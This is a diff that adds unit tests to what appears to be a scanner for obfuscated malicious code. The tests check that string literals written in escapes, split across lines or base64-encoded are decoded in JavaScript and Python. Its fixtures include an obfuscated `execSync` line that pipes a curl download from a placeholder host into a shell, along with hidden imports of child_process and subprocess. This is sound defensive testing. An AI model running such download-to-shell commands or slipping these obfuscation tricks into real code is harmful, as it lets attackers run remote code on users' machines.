@@ -97,6 +97,56 @@ class DecodedViewTests(unittest.TestCase):
         self.assertLess(time.perf_counter() - start, 5.0)
 
 
+class LiteralsReadByTheLexersTests(unittest.TestCase):
+    """Phase 2: in JavaScript and Python the decoded view reads string
+    literals as the runtime reads them (lex/value.rs): a literal partly
+    written in escapes, literals joined across lines, quote kinds and
+    comments, Python's adjacent literals. A text of no known language keeps
+    the patterns' reading (only literals wholly in \\x and \\u escapes)."""
+
+    PARTLY = "require('child_pro\\x63ess').execSync('cu\\x72l https://x.invalid/i.sh | sh');\n"
+
+    def test_a_literal_partly_written_in_escapes(self):
+        self.assertEqual(core.decoded_view(self.PARTLY, "js"),
+                         "require('child_process').execSync('curl https://x.invalid/i.sh | sh');\n")
+        self.assertEqual(core.decoded_view(self.PARTLY), self.PARTLY)
+        self.assertEqual(core.decoded_view("os.sys\\x74em('x')\n", "py"), "os.sys\\x74em('x')\n")  # (code)
+        self.assertEqual(core.decoded_view("os.system('cu\\x72l x')\n", "py"), "os.system('curl x')\n")
+
+    def test_the_install_script_test_reads_them(self):
+        self.assertEqual(core.install_script_risk(self.PARTLY, lang="js"), ["pipes a download into a shell" + NOTE])
+        self.assertEqual(core.install_script_risk(self.PARTLY), [])
+        cmd = 'node -e "%s"' % self.PARTLY.strip()          # (in sh's double quotes \\x is as written)
+        self.assertIn("pipes a download into a shell" + NOTE, core.hook_command_risk(cmd))
+
+    def test_literals_joined_across_lines_quotes_and_comments(self):
+        b64 = base64.b64encode(b"child_process").decode()
+        text = "const cp = require(atob('%s' +\n  /* part */ \"%s\"));\nmodule.exports = cp;\n" % (b64[:8], b64[8:])
+        view = core.decoded_view(text, "js")
+        self.assertEqual(view, "const cp = require('child_process');\n\nmodule.exports = cp;\n")
+        self.assertEqual(view.count("\n"), text.count("\n"))            # the lines after keep their numbers
+        self.assertEqual(core.decoded_view(text), text)
+
+    def test_python_adjacent_literals(self):
+        b64 = base64.b64encode(b"subprocess").decode()
+        text = "import base64\nm = __import__(base64.b64decode('%s'\n    '%s').decode())\n" % (b64[:6], b64[6:])
+        self.assertEqual(core.decoded_view(text, "py"), "import base64\nm = __import__('subprocess')\n\n")
+        # at the top level a line break ends the statement: nothing is joined
+        top = "import base64\nbase64.b64decode('%s')\n'%s'.decode()\n" % (b64[:6], b64[6:])
+        self.assertEqual(core.decoded_view(top, "py"), top)
+
+    def test_joins_alone_decode_nothing(self):
+        for text, lang in (("x = 'a' + 'b'\n", "js"), ("x = ('a'\n 'b')\n", "py")):
+            with self.subTest(text):
+                self.assertEqual(core.decoded_view(text, lang), text)
+
+    def test_what_binds_tighter_is_not_joined(self):
+        b64 = base64.b64encode(b"child_process").decode()
+        # `'…' + '…'.trim()`: the second literal is trim's, not the join's
+        text = "require(atob('%s' + '%s'.trim()))\n" % (b64[:8], b64[8:])
+        self.assertEqual(core.decoded_view(text, "js"), text)
+
+
 def xored(text, key, kind="base64"):
     data = bytes(b ^ key[i % len(key)] for i, b in enumerate(text.encode()))
     return data.hex() if kind == "hex" else base64.b64encode(data).decode().rstrip("=")
